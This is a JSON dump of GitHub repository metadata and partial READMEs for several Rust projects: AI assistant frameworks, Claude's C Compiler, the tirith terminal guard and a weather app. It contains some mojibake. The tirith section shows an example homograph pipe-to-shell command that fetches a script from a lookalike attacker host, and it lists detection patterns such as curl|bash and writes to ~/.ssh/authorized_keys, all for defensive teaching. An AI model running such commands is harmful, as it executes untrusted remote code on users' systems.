[
  {
    "basic_info": {
      "name": "zeroclaw",
      "full_name": "zeroclaw-labs/zeroclaw",
      "owner": "zeroclaw-labs",
      "description": "Fast, small, and fully autonomous AI assistant infrastructure ‚Äî deploy anywhere, swap anything ü¶Ä",
      "url": "https://github.com/zeroclaw-labs/zeroclaw",
      "clone_url": "https://github.com/zeroclaw-labs/zeroclaw.git",
      "ssh_url": "git@github.com:zeroclaw-labs/zeroclaw.git",
      "homepage": "",
      "created_at": "2026-02-13T08:56:04Z",
      "updated_at": "2026-02-20T03:27:43Z",
      "pushed_at": "2026-02-20T03:26:50Z"
    },
    "stats": {
      "stars": 15141,
      "forks": 1605,
      "watchers": 15141,
      "open_issues": 79,
      "size": 7404
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 3809667,
        "Shell": 65922,
        "Python": 45596,
        "Dockerfile": 6233,
        "C++": 4188,
        "Slint": 1848,
        "Nix": 1523
      },
      "license": "Other",
      "topics": []
    },
    "content": {
      "readme": "<p align=\"center\">\n  <img src=\"zeroclaw.png\" alt=\"ZeroClaw\" width=\"200\" />\n</p>\n\n<h1 align=\"center\">ZeroClaw ü¶Ä</h1>\n\n<p align=\"center\">\n  <strong>Zero overhead. Zero compromise. 100% Rust. 100% Agnostic.</strong><br>\n  ‚ö°Ô∏è <strong>Runs on $10 hardware with <5MB RAM: That's 99% less memory than OpenClaw and 98% cheaper than a Mac mini!</strong>\n</p>\n\n<p align=\"center\">\n  <a href=\"LICENSE\"><img src=\"https://img.shields.io/badge/license-MIT-blue.svg\" alt=\"License: MIT\" /></a>\n  <a href=\"NOTICE\"><img src=\"https://img.shields.io/badge/contributors-27+-green.svg\" alt=\"Contributors\" /></a>\n  <a href=\"https://buymeacoffee.com/argenistherose\"><img src=\"https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Donate-yellow.svg?style=flat&logo=buy-me-a-coffee\" alt=\"Buy Me a Coffee\" /></a>\n  <a href=\"https://x.com/zeroclawlabs?s=21\"><img src=\"https://img.shields.io/badge/X-%40zeroclawlabs-000000?style=flat&logo=x&logoColor=white\" alt=\"X: @zeroclawlabs\" /></a>\n  <a href=\"https://www.xiaohongshu.com/user/profile/67cbfc43000000000d008307?xsec_token=AB73VnYnGNx5y36EtnnZfGmAmS-6Wzv8WMuGpfwfkg6Yc%3D&xsec_source=pc_search\"><img src=\"https://img.shields.io/badge/Xiaohongshu-Official-FF2442?style=flat\" alt=\"Xiaohongshu: Official\" /></a>\n  <a href=\"https://t.me/zeroclawlabs\"><img src=\"https://img.shields.io/badge/Telegram-%40zeroclawlabs-26A5E4?style=flat&logo=telegram&logoColor=white\" alt=\"Telegram: @zeroclawlabs\" /></a>\n  <a href=\"https://t.me/zeroclawlabs_cn\"><img src=\"https://img.shields.io/badge/Telegram%20CN-%40zeroclawlabs__cn-26A5E4?style=flat&logo=telegram&logoColor=white\" alt=\"Telegram CN: @zeroclawlabs_cn\" /></a>\n  <a href=\"https://t.me/zeroclawlabs_ru\"><img src=\"https://img.shields.io/badge/Telegram%20RU-%40zeroclawlabs__ru-26A5E4?style=flat&logo=telegram&logoColor=white\" alt=\"Telegram RU: @zeroclawlabs_ru\" /></a>\n  <a href=\"https://www.reddit.com/r/zeroclawlabs/\"><img src=\"https://img.shields.io/badge/Reddit-r%2Fzeroclawlabs-FF4500?style=flat&logo=reddit&logoColor=white\" alt=\"Reddit: r/zeroclawlabs\" /></a>\n</p>\n<p align=\"center\">\nBuilt by students and members of the Harvard, MIT, and Sundai.Club communities.\n</p>\n\n<p align=\"center\">\n  üåê <strong>Languages:</strong> <a href=\"README.md\">English</a> ¬∑ <a href=\"README.zh-CN.md\">ÁÆÄ‰Ωì‰∏≠Êñá</a> ¬∑ <a href=\"README.ja.md\">Êó•Êú¨Ë™û</a> ¬∑ <a href=\"README.ru.md\">–†—É—Å—Å–∫–∏–π</a>\n</p>\n\n<p align=\"center\">\n  <a href=\"#quick-start\">Getting Started</a> |\n  <a href=\"bootstrap.sh\">One-Click Setup</a> |\n  <a href=\"docs/README.md\">Docs Hub</a> |\n  <a href=\"docs/SUMMARY.md\">Docs TOC</a>\n</p>\n\n<p align=\"center\">\n  <strong>Quick Routes:</strong>\n  <a href=\"docs/reference/README.md\">Reference</a> ¬∑\n  <a href=\"docs/operations/README.md\">Operations</a> ¬∑\n  <a href=\"docs/troubleshooting.md\">Troubleshoot</a> ¬∑\n  <a href=\"docs/security/README.md\">Security</a> ¬∑\n  <a href=\"docs/hardware/README.md\">Hardware</a> ¬∑\n  <a href=\"docs/contributing/README.md\">Contribute</a>\n</p>\n\n<p align=\"center\">\n  <strong>Fast, small, and fully autonomous AI assistant infrastructure</strong><br />\n  Deploy anywhere. Swap anything.\n</p>\n\n<p align=\"center\"><code>Trait-driven architecture ¬∑ secure-by-default runtime ¬∑ provider/channel/tool swappable ¬∑ pluggable everything</code></p>\n\n### üì¢ Announcements\n\nUse this board for important notices (breaking changes, security advisories, maintenance windows, and release blockers).\n\n| Date (UTC) | Level | Notice | Action |\n|---|---|---|---|\n| 2026-02-19 | _Critical_ | We are **not affiliated** with `openagen/zeroclaw` or `zeroclaw.org`. The `zeroclaw.org` domain currently points to the `openagen/zeroclaw` fork, and that domain/repository are impersonating our official website/project. | Do not trust information, binaries, fundraising, or announcements from those sources. Use only this repository and our verified social accounts. |\n| 2026-02-19 | _Important_ | We have **not** launched an official website yet, and we are seeing impersonation attempts. Do **not** join any investment or fundraising activity claiming the ZeroClaw name. | Use this repository as the single source of truth. Follow [X (@zeroclawlabs)](https://x.com/zeroclawlabs?s=21), [Reddit (r/zeroclawlabs)](https://www.reddit.com/r/zeroclawlabs/), [Telegram (@zeroclawlabs)](https://t.me/zeroclawlabs), [Telegram CN (@zeroclawlabs_cn)](https://t.me/zeroclawlabs_cn), [Telegram RU (@zeroclawlabs_ru)](https://t.me/zeroclawlabs_ru), and [Xiaohongshu](https://www.xiaohongshu.com/user/profile/67cbfc43000000000d008307?xsec_token=AB73VnYnGNx5y36EtnnZfGmAmS-6Wzv8WMuGpfwfkg6Yc%3D&xsec_source=pc_search) for official updates. |\n| 2026-02-19 | _Important_ | Anthropic updated the Authentication and Credential Use terms on 2026-02-19. OAuth authentication (Free, Pro, Max) is intended exclusively for Claude Code and Claude.ai; using OAuth tokens from Claude Free/Pro/Max in any other product, tool, or service (including Agent SDK) is not permitted and may violate the Consumer Terms of Service. | Please temporarily avoid Claude Code OAuth integrations to prevent",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:10.517162"
  },
  {
    "basic_info": {
      "name": "ironclaw",
      "full_name": "nearai/ironclaw",
      "owner": "nearai",
      "description": "IronClaw is OpenClaw inspired implementation in Rust focused on privacy and security",
      "url": "https://github.com/nearai/ironclaw",
      "clone_url": "https://github.com/nearai/ironclaw.git",
      "ssh_url": "git@github.com:nearai/ironclaw.git",
      "homepage": "",
      "created_at": "2026-02-03T06:57:10Z",
      "updated_at": "2026-02-20T03:24:18Z",
      "pushed_at": "2026-02-20T03:12:14Z"
    },
    "stats": {
      "stars": 2441,
      "forks": 217,
      "watchers": 2441,
      "open_issues": 108,
      "size": 4440
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 4201076,
        "JavaScript": 73082,
        "CSS": 45702,
        "PLpgSQL": 11902,
        "HTML": 8188,
        "Shell": 6780,
        "Dockerfile": 1615
      },
      "license": "Apache License 2.0",
      "topics": []
    },
    "content": {
      "readme": "<p align=\"center\">\n  <img src=\"ironclaw.png\" alt=\"IronClaw\" width=\"200\"/>\n</p>\n\n<h1 align=\"center\">IronClaw</h1>\n\n<p align=\"center\">\n  <strong>Your secure personal AI assistant, always on your side</strong>\n</p>\n\n<p align=\"center\">\n  <a href=\"#philosophy\">Philosophy</a> ‚Ä¢\n  <a href=\"#features\">Features</a> ‚Ä¢\n  <a href=\"#installation\">Installation</a> ‚Ä¢\n  <a href=\"#configuration\">Configuration</a> ‚Ä¢\n  <a href=\"#security\">Security</a> ‚Ä¢\n  <a href=\"#architecture\">Architecture</a>\n</p>\n\n---\n\n## Philosophy\n\nIronClaw is built on a simple principle: **your AI assistant should work for you, not against you**.\n\nIn a world where AI systems are increasingly opaque about data handling and aligned with corporate interests, IronClaw takes a different approach:\n\n- **Your data stays yours** - All information is stored locally, encrypted, and never leaves your control\n- **Transparency by design** - Open source, auditable, no hidden telemetry or data harvesting\n- **Self-expanding capabilities** - Build new tools on the fly without waiting for vendor updates\n- **Defense in depth** - Multiple security layers protect against prompt injection and data exfiltration\n\nIronClaw is the AI assistant you can actually trust with your personal and professional life.\n\n## Features\n\n### Security First\n\n- **WASM Sandbox** - Untrusted tools run in isolated WebAssembly containers with capability-based permissions\n- **Credential Protection** - Secrets are never exposed to tools; injected at the host boundary with leak detection\n- **Prompt Injection Defense** - Pattern detection, content sanitization, and policy enforcement\n- **Endpoint Allowlisting** - HTTP requests only to explicitly approved hosts and paths\n\n### Always Available\n\n- **Multi-channel** - REPL, HTTP webhooks, WASM channels (Telegram, Slack), and web gateway\n- **Docker Sandbox** - Isolated container execution with per-job tokens and orchestrator/worker pattern\n- **Web Gateway** - Browser UI with real-time SSE/WebSocket streaming\n- **Routines** - Cron schedules, event triggers, webhook handlers for background automation\n- **Heartbeat System** - Proactive background execution for monitoring and maintenance tasks\n- **Parallel Jobs** - Handle multiple requests concurrently with isolated contexts\n- **Self-repair** - Automatic detection and recovery of stuck operations\n\n### Self-Expanding\n\n- **Dynamic Tool Building** - Describe what you need, and IronClaw builds it as a WASM tool\n- **MCP Protocol** - Connect to Model Context Protocol servers for additional capabilities\n- **Plugin Architecture** - Drop in new WASM tools and channels without restarting\n\n### Persistent Memory\n\n- **Hybrid Search** - Full-text + vector search using Reciprocal Rank Fusion\n- **Workspace Filesystem** - Flexible path-based storage for notes, logs, and context\n- **Identity Files** - Maintain consistent personality and preferences across sessions\n\n## Installation\n\n### Prerequisites\n\n- Rust 1.85+\n- PostgreSQL 15+ with [pgvector](https://github.com/pgvector/pgvector) extension\n- NEAR AI account (authentication handled via setup wizard)\n\n## Download or Build\n\nVisit [Releases page](https://github.com/nearai/ironclaw/releases/) to see the latest updates.\n\n<details>\n  <summary>Install via Windows Installer (Windows)</summary>\n\nDownload the [Windows Installer](https://github.com/nearai/ironclaw/releases/latest/download/ironclaw-x86_64-pc-windows-msvc.msi) and run it.\n\n</details>\n\n<details>\n  <summary>Install via powershell script (Windows)</summary>\n\n```sh\nirm https://github.com/nearai/ironclaw/releases/latest/download/ironclaw-installer.ps1 | iex\n```\n\n</details>\n\n<details>\n  <summary>Install via shell script (macOS, Linux, Windows/WSL)</summary>\n\n```sh\ncurl --proto '=https' --tlsv1.2 -LsSf https://github.com/nearai/ironclaw/releases/latest/download/ironclaw-installer.sh | sh\n```\n</details>\n\n<details>\n  <summary>Compile the source code (Cargo on Windows, Linux, macOS)</summary>\n\nInstall it with `cargo`, just make sure you have [Rust](https://rustup.rs) installed on your computer.\n\n```bash\n# Clone the repository\ngit clone https://github.com/nearai/ironclaw.git\ncd ironclaw\n\n# Build\ncargo build --release\n\n# Run tests\ncargo test\n```\n\nFor **full release** (after modifying channel sources), run `./scripts/build-all.sh` to rebuild channels first.\n\n</details>\n\n### Database Setup\n\n```bash\n# Create database\ncreatedb ironclaw\n\n# Enable pgvector\npsql ironclaw -c \"CREATE EXTENSION IF NOT EXISTS vector;\"\n```\n\n## Configuration\n\nRun the setup wizard to configure IronClaw:\n\n```bash\nironclaw onboard\n```\n\nThe wizard handles database connection, NEAR AI authentication (via browser OAuth),\nand secrets encryption (using your system keychain). Settings are persisted in the\nconnected database; bootstrap variables (e.g. `DATABASE_URL`, `LLM_BACKEND`) are\nwritten to `~/.ironclaw/.env` so they are available before the database connects.\n\n## Security\n\nIronClaw implements defense in depth to protect your data and prevent misuse.\n\n### WASM Sandbox\n\nA",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:11.669376"
  },
  {
    "basic_info": {
      "name": "claudes-c-compiler",
      "full_name": "anthropics/claudes-c-compiler",
      "owner": "anthropics",
      "description": "Claude Opus 4.6 wrote a dependency-free C compiler in Rust, with backends targeting x86 (64- and 32-bit), ARM, and RISC-V, capable of compiling a booting Linux kernel.",
      "url": "https://github.com/anthropics/claudes-c-compiler",
      "clone_url": "https://github.com/anthropics/claudes-c-compiler.git",
      "ssh_url": "git@github.com:anthropics/claudes-c-compiler.git",
      "homepage": null,
      "created_at": "2026-02-04T22:42:22Z",
      "updated_at": "2026-02-20T01:43:45Z",
      "pushed_at": "2026-02-05T17:14:51Z"
    },
    "stats": {
      "stars": 2251,
      "forks": 148,
      "watchers": 2251,
      "open_issues": 43,
      "size": 11788
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 8154079,
        "C": 325007,
        "Shell": 1825
      },
      "license": "Creative Commons Zero v1.0 Universal",
      "topics": []
    },
    "content": {
      "readme": "# CCC ‚Äî Claude's C Compiler\n\nA C compiler written entirely from scratch in Rust, targeting x86-64, i686,\nAArch64, and RISC-V 64. Zero compiler-specific dependencies ‚Äî the frontend,\nSSA-based IR, optimizer, code generator, peephole optimizers, assembler,\nlinker, and DWARF debug info generation are all implemented from scratch.\nClaude's C Compiler produces ELF executables without any external toolchain.\n\n> Note: With the exception of this one paragraph that was written by a human, 100% of the code and documentation in this repository was written by Claude Opus 4.6. A human guided some of this process by writing test cases that Claude was told to pass, but never interactively pair-programmed with Claude to debug or to provide feedback on code quality. As a result, I do not recommend you use this code! None of it has been validated for correctness. Claude wrote this exclusively on a Linux host; it probably will not work on MacOS/Windows ‚Äî neither I nor Claude have tried. The docs may be wrong and make claims that are false. See [our blog post](https://anthropic.com/engineering/building-c-compiler) for more detail.\n\n## Prerequisites\n\n- **Rust** (stable, 2021 edition) ‚Äî install via [rustup](https://rustup.rs/)\n- **Linux host** ‚Äî the compiler targets Linux ELF executables and relies on\n  Linux system headers / C runtime libraries (glibc or musl) being installed\n  on the host\n- For cross-compilation targets (ARM, RISC-V, i686), the corresponding\n  cross-compilation sysroots should be installed (e.g.,\n  `aarch64-linux-gnu-gcc`, `riscv64-linux-gnu-gcc`)\n\n## Building\n\n```bash\ncargo build --release\n```\n\nThis produces five binaries in `target/release/`, all compiled from the same\nsource. The target architecture is selected by the binary name at runtime:\n\n| Binary | Target |\n|--------|--------|\n| `ccc` | x86-64 (default) |\n| `ccc-x86` | x86-64 |\n| `ccc-arm` | AArch64 |\n| `ccc-riscv` | RISC-V 64 |\n| `ccc-i686` | i686 (32-bit x86) |\n\n## Quick Start\n\nCompile and run a simple C program:\n\n```bash\n# Write a test program\ncat > hello.c << 'EOF'\n#include <stdio.h>\nint main(void) {\n    printf(\"Hello from CCC!\\n\");\n    return 0;\n}\nEOF\n\n# Compile and run (x86-64)\n./target/release/ccc -o hello hello.c\n./hello\n\n# Cross-compile for AArch64 and run under QEMU\n./target/release/ccc-arm -o hello-arm hello.c\nqemu-aarch64 -L /usr/aarch64-linux-gnu ./hello-arm\n```\n\nCCC works as a drop-in GCC replacement. Point your build system at it:\n\n```bash\n# Build a project with make\nmake CC=/path/to/ccc-x86\n\n# Build a project with CMake\ncmake -DCMAKE_C_COMPILER=/path/to/ccc-x86 ..\n\n# Build a project with configure scripts\n./configure CC=/path/to/ccc-x86\n```\n\n## Usage\n\n```bash\n# Compile and link\nccc -o output input.c                # x86-64\nccc-arm -o output input.c            # AArch64\nccc-riscv -o output input.c          # RISC-V 64\nccc-i686 -o output input.c           # i686\n\n# GCC-compatible flags\nccc -S input.c                       # Emit assembly\nccc -c input.c                       # Compile to object file\nccc -E input.c                       # Preprocess only\nccc -O2 -o output input.c            # Optimize (accepts -O0 through -O3, -Os, -Oz)\nccc -g -o output input.c             # DWARF debug info\nccc -DFOO=1 -Iinclude/ input.c       # Define macros, add include paths\nccc -Werror -Wall input.c            # Warning control\nccc -fPIC -shared -o lib.so lib.c    # Position-independent code\nccc -x c -E -                        # Read from stdin\n\n# Build system integration (reports as GCC 14.2.0 for compatibility)\nccc -dumpmachine     # x86_64-linux-gnu / aarch64-linux-gnu / riscv64-linux-gnu / i686-linux-gnu\nccc -dumpversion     # 14\n```\n\nThe compiler accepts most GCC flags. Unrecognized flags (e.g., architecture-\nspecific `-m` flags, unknown `-f` flags) are silently ignored so `ccc` can\nserve as a drop-in GCC replacement in build systems.\n\n### Assembler and Linker Modes\n\nBy default, the compiler uses its **builtin assembler and linker** for all\nfour architectures. No external toolchain is required. You can verify this\nwith `--version`, which shows `Backend: standalone` when using the builtin\ntools.\n\nTo build with optional GCC fallback support (e.g., for debugging), enable\nCargo features at compile time:\n\n```bash\n# Build with GCC assembler and linker fallback\ncargo build --release --features gcc_assembler,gcc_linker\n\n# Build with GCC fallback for -m16 boot code only\ncargo build --release --features gcc_m16\n```\n\n| Feature | Description |\n|---------|-------------|\n| `gcc_assembler` | Use GCC as the assembler instead of the builtin |\n| `gcc_linker` | Use GCC as the linker instead of the builtin |\n| `gcc_m16` | Use GCC for `-m16` (16-bit real mode boot code) |\n\nWhen compiled with GCC fallback features enabled, `--version` shows which\ncomponents use GCC (e.g., `Backend: gcc_assembler, gcc_linker`).\n\n## Status\n\nThe compiler can build real-world C codebases across all four architectures,\nincluding the Linux kernel. Projects that compile and pass their test su",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:12.833546"
  },
  {
    "basic_info": {
      "name": "tirith",
      "full_name": "sheeki03/tirith",
      "owner": "sheeki03",
      "description": "Your browser catches homograph attacks. Your terminal doesn't. Tirith guards the gate ‚Äî intercepts suspicious URLs, ANSI injection, and pipe-to-shell attacks before they execute.",
      "url": "https://github.com/sheeki03/tirith",
      "clone_url": "https://github.com/sheeki03/tirith.git",
      "ssh_url": "git@github.com:sheeki03/tirith.git",
      "homepage": null,
      "created_at": "2026-02-02T04:33:47Z",
      "updated_at": "2026-02-20T01:26:33Z",
      "pushed_at": "2026-02-11T13:33:47Z"
    },
    "stats": {
      "stars": 1823,
      "forks": 57,
      "watchers": 1823,
      "open_issues": 6,
      "size": 246
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 324022,
        "Shell": 55991,
        "PowerShell": 10458,
        "Nix": 2426,
        "Ruby": 1739,
        "JavaScript": 1162,
        "Dockerfile": 550
      },
      "license": "GNU Affero General Public License v3.0",
      "topics": [
        "cli",
        "devtools",
        "homograph-attack",
        "rust",
        "security",
        "shell",
        "supply-chain-security",
        "terminal",
        "unicode",
        "url-security"
      ]
    },
    "content": {
      "readme": "# tirith\n\n**Your browser would catch this. Your terminal won't.**\n\n[![CI](https://github.com/sheeki03/tirith/actions/workflows/ci.yml/badge.svg)](https://github.com/sheeki03/tirith/actions/workflows/ci.yml)\n[![GitHub Stars](https://img.shields.io/github/stars/sheeki03/tirith?style=flat&logo=github)](https://github.com/sheeki03/tirith/stargazers)\n[![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-blue)](LICENSE-AGPL)\n\n---\n\nCan you spot the difference?\n\n```\n  curl -sSL https://install.example-cli.dev | bash     # safe\n  curl -sSL https://—ñnstall.example-cl—ñ.dev | bash     # compromised\n```\n\nYou can't. Neither can your terminal. Both `—ñ` characters are Cyrillic (U+0456), not Latin `i`. The second URL resolves to an attacker's server. The script executes before you notice.\n\nBrowsers solved this years ago. Terminals still render Unicode, ANSI escapes, and invisible characters without question.\n\n**Tirith stands at the gate.**\n\n```bash\nbrew install sheeki03/tap/tirith\n```\n\nThen activate in your shell profile:\n\n```bash\n# zsh\neval \"$(tirith init --shell zsh)\"\n\n# bash\neval \"$(tirith init --shell bash)\"\n\n# fish\ntirith init --shell fish | source\n```\n\nThat's it. Every command you run is now guarded. Zero friction on clean input. Sub-millisecond overhead. You forget it's there until it saves you.\n\nAlso available via [npm](#cross-platform), [cargo](#cross-platform), [mise](#cross-platform), [apt/dnf](#linux-packages), and [more](#install).\n\n---\n\n## See it work\n\n**Homograph attack ‚Äî blocked before execution:**\n\n```\n$ curl -sSL https://—ñnstall.example-cl—ñ.dev | bash\n\ntirith: BLOCKED\n  [CRITICAL] non_ascii_hostname ‚Äî Cyrillic —ñ (U+0456) in hostname\n    This is a homograph attack. The URL visually mimics a legitimate\n    domain but resolves to a completely different server.\n  Bypass: prefix your command with TIRITH=0 (applies to that command only)\n```\n\nThe command never executes.\n\n**Pipe-to-shell with clean URL ‚Äî warned, not blocked:**\n\n```\n$ curl -fsSL https://get.docker.com | sh\n\ntirith: WARNING\n  [MEDIUM] pipe_to_interpreter ‚Äî Download piped to interpreter\n    Consider downloading first and reviewing.\n```\n\nWarning prints to stderr. Command still runs.\n\n**Normal commands ‚Äî invisible:**\n\n```\n$ git status\n$ ls -la\n$ docker compose up -d\n```\n\nNothing. Zero output. You forget tirith is running.\n\n---\n\n## What it catches\n\n**30 rules across 7 categories.** All analysis is local. No network calls.\n\n| Category | What it stops |\n|----------|--------------|\n| **Homograph attacks** | Cyrillic/Greek lookalikes in hostnames, punycode domains, mixed-script labels |\n| **Terminal injection** | ANSI escape sequences that rewrite your display, bidi overrides that reverse text, zero-width characters that hide in domains |\n| **Pipe-to-shell** | `curl \\| bash`, `wget \\| sh`, `python <(curl ...)`, `eval $(wget ...)` ‚Äî every source-to-sink pattern |\n| **Dotfile attacks** | Downloads targeting `~/.bashrc`, `~/.ssh/authorized_keys`, `~/.gitconfig` ‚Äî blocked, not just warned |\n| **Insecure transport** | Plain HTTP piped to shell, `curl -k`, disabled TLS verification |\n| **Ecosystem threats** | Git clone typosquats, untrusted Docker registries, pip/npm URL installs |\n| **Credential exposure** | `http://user:pass@host` userinfo tricks, shortened URLs hiding destinations |\n\n---\n\n## Install\n\n### macOS\n\n**Homebrew:**\n\n```bash\nbrew install sheeki03/tap/tirith\n```\n\n### Linux Packages\n\n**Debian / Ubuntu (.deb):**\n\nDownload from [GitHub Releases](https://github.com/sheeki03/tirith/releases/latest), then:\n\n```bash\nsudo dpkg -i tirith_*_amd64.deb\n```\n\n**Fedora / RHEL / CentOS 9+ (.rpm):**\n\nDownload from [GitHub Releases](https://github.com/sheeki03/tirith/releases/latest), then:\n\n```bash\nsudo dnf install ./tirith-*.rpm\n```\n\n**Arch Linux (AUR):**\n\n```bash\nyay -S tirith\n# or: paru -S tirith\n```\n\n**Nix:**\n\n```bash\nnix profile install github:sheeki03/tirith\n# or try without installing: nix run github:sheeki03/tirith -- --version\n```\n\n### Windows\n\n**Scoop:**\n\n```powershell\nscoop bucket add tirith https://github.com/sheeki03/scoop-tirith\nscoop install tirith\n```\n\n**Chocolatey:**\n\n```powershell\nchoco install tirith\n```\n\n### Cross-Platform\n\n**npm:**\n\n```bash\nnpm install -g tirith\n```\n\n**Cargo:**\n\n```bash\ncargo install tirith\n```\n\n**[Mise](https://mise.jdx.dev/)** (official registry):\n\n```bash\nmise use -g tirith\n```\n\n**asdf:**\n\n```bash\nasdf plugin add tirith https://github.com/sheeki03/asdf-tirith.git\nasdf install tirith latest\nasdf global tirith latest\n```\n\n**Docker:**\n\n```bash\ndocker run --rm ghcr.io/sheeki03/tirith check -- \"curl https://example.com | bash\"\n```\n\n### Activate\n\nAdd to your shell profile (`.zshrc`, `.bashrc`, or `config.fish`):\n\n```bash\neval \"$(tirith init --shell zsh)\"   # in ~/.zshrc\neval \"$(tirith init --shell bash)\"  # in ~/.bashrc\ntirith init --shell fish | source   # in ~/.config/fish/config.fish\n```\n\n| Shell | Hook type | Tested on |\n|-------|-----------|-----------|\n| zsh | preexec + paste widget | 5.8+ |\n| bash | preexec (two ",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:14.015617"
  },
  {
    "basic_info": {
      "name": "weathr",
      "full_name": "Veirt/weathr",
      "owner": "Veirt",
      "description": "a terminal weather app with ascii animation",
      "url": "https://github.com/Veirt/weathr",
      "clone_url": "https://github.com/Veirt/weathr.git",
      "ssh_url": "git@github.com:Veirt/weathr.git",
      "homepage": "",
      "created_at": "2026-02-08T17:52:29Z",
      "updated_at": "2026-02-20T03:27:07Z",
      "pushed_at": "2026-02-19T15:25:46Z"
    },
    "stats": {
      "stars": 1677,
      "forks": 62,
      "watchers": 1677,
      "open_issues": 11,
      "size": 3943
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 183432,
        "Nix": 3251
      },
      "license": "GNU General Public License v3.0",
      "topics": [
        "cli",
        "rust-lang",
        "terminal",
        "tui",
        "weather"
      ]
    },
    "content": {
      "readme": "# weathr\n\n[![Crates.io](https://img.shields.io/crates/v/weathr.svg)](https://crates.io/crates/weathr)\n[![Downloads](https://img.shields.io/crates/d/weathr.svg)](https://crates.io/crates/weathr)\n[![License](https://img.shields.io/crates/l/weathr.svg)](https://github.com/veirt/weathr/blob/main/LICENSE)\n\nA terminal weather app with ASCII animations driven by real-time weather data.\n\nFeatures real-time weather from Open-Meteo with animated rain, snow, thunderstorms, flying airplanes, day/night cycles, and auto-location detection.\n\n## Demo\n\n|                                    Thunderstorm Night                                     |                             Snow                              |\n| :---------------------------------------------------------------------------------------: | :-----------------------------------------------------------: |\n| <img src=\"docs/thunderstorm-night.gif\" width=\"600\" height=\"400\" alt=\"Thunderstorm Night\"> | <img src=\"docs/snow.gif\" width=\"600\" height=\"400\" alt=\"Snow\"> |\n\n## Contents\n\n- [Installation](#installation)\n- [Configuration](#configuration)\n- [Usage](#usage)\n- [Privacy](#privacy)\n- [Roadmap](#roadmap)\n- [License](#license)\n\n## Installation\n\n### Via Cargo\n\n```bash\ncargo install weathr\n```\n\n### Build from Source\n\nYou need Rust installed.\n\n```bash\ngit clone https://github.com/veirt/weathr.git\ncd weathr\ncargo install --path .\n```\n\n### Arch Linux\n\nAvailable in AUR:\n```bash\nyay -S weathr\n```\nor \n```bash\nyay -S weathr-bin\n```\n\n### Nix flake (NixOS)\n\nAvailable as a flake:\n```nix\ninputs = {\n    weathr.url = \"github:Veirt/weathr\";\n};\n```\nAdd to packages:\n```nix\nenvironment.systemPackages = [\n    inputs.weathr.packages.${system}.default\n];\n```\nor use home-manager module option:\n```nix\nimports = [\n    inputs.weathr.homeModules.weathr\n];\n\nprograms.weathr = {\n    enable = true;\n    settings = {\n        hide_hud = true;\n    };\n};\n```\n\n## Configuration\n\nThe config file location depends on your platform:\n\n- **Linux**: `~/.config/weathr/config.toml` (or `$XDG_CONFIG_HOME/weathr/config.toml`)\n- **macOS**: `~/Library/Application Support/weathr/config.toml`\n\nYou can also place a `config.toml` in the current working directory, which takes priority over the default location.\n\n### Setup\n\n```bash\n# Linux\nmkdir -p ~/.config/weathr\n\n# macOS\nmkdir -p ~/Library/Application\\ Support/weathr\n```\n\nEdit the config file at the appropriate path for your platform:\n\n```toml\n# Hide the HUD (Heads Up Display) with weather details\nhide_hud = false\n\n# Run silently without startup messages (errors still shown)\nsilent = false\n\n[location]\n# Location coordinates (overridden if auto = true)\nlatitude = 40.7128\nlongitude = -74.0060\n\n# Auto-detect location via IP (defaults to true if config missing)\nauto = false\n\n# Hide the location name in the UI\nhide = false\n\n[units]\n# Temperature unit: \"celsius\" or \"fahrenheit\"\ntemperature = \"celsius\"\n\n# Wind speed unit: \"kmh\", \"ms\", \"mph\", or \"kn\"\nwind_speed = \"kmh\"\n\n# Precipitation unit: \"mm\" or \"inch\"\nprecipitation = \"mm\"\n```\n\n### Example Locations\n\n```toml\n# Tokyo, Japan\nlatitude = 35.6762\nlongitude = 139.6503\n\n# Sydney, Australia\nlatitude = -33.8688\nlongitude = 151.2093\n```\n\n## Usage\n\nRun with real-time weather:\n\n```bash\nweathr\n```\n\n### CLI Options\n\nSimulate weather conditions for testing:\n\n```bash\n# Simulate rain\nweathr --simulate rain\n\n# Simulate snow at night\nweathr --simulate snow --night\n\n# Clear day with falling leaves\nweathr --simulate clear --leaves\n```\n\nAvailable weather conditions:\n\n- Clear Skies: `clear`, `partly-cloudy`, `cloudy`, `overcast`\n- Precipitation: `fog`, `drizzle`, `rain`, `freezing-rain`, `rain-showers`\n- Snow: `snow`, `snow-grains`, `snow-showers`\n- Storms: `thunderstorm`, `thunderstorm-hail`\n\nOverride configuration:\n\n```bash\n# Use imperial units (¬∞F, mph, inch)\nweathr --imperial\n\n# Use metric units (¬∞C, km/h, mm) - default\nweathr --metric\n\n# Auto-detect location via IP\nweathr --auto-location\n\n# Hide location coordinates\nweathr --hide-location\n\n# Hide status HUD\nweathr --hide-hud\n\n# Run silently (suppress non-error output)\nweathr --silent\n\n# Combine flags\nweathr --imperial --auto-location\n```\n\n### Keyboard Controls\n\n- `q` or `Q` - Quit\n- `Ctrl+C` - Exit\n\n### Environment Variables\n\nThe application respects several environment variables:\n\n- `NO_COLOR` - When set, disables all color output (accessibility feature)\n- `COLORTERM` - Detects truecolor support (values: \"truecolor\", \"24bit\")\n- `TERM` - Used for terminal capability detection (e.g., \"xterm-256color\")\n\nExamples:\n\n```bash\n# Disable colors for accessibility\nNO_COLOR=1 weathr\n```\n\n## Privacy\n\n### Location Detection\n\nWhen using `auto = true` in config or the `--auto-location` flag, the application makes a request to `ipinfo.io` to detect your approximate location based on your IP address.\n\nThis is optional. You can disable auto-location and manually specify coordinates in your config file to avoid external API calls.\n\n## Roadmap\n\n- [ ] Support for OpenWeatherMap, WeatherAPI, etc.\n- [x] Installation via",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:15.172151"
  },
  {
    "basic_info": {
      "name": "Kaku",
      "full_name": "tw93/Kaku",
      "owner": "tw93",
      "description": "üéÉ A fast, out-of-the-box terminal built for AI coding.",
      "url": "https://github.com/tw93/Kaku",
      "clone_url": "https://github.com/tw93/Kaku.git",
      "ssh_url": "git@github.com:tw93/Kaku.git",
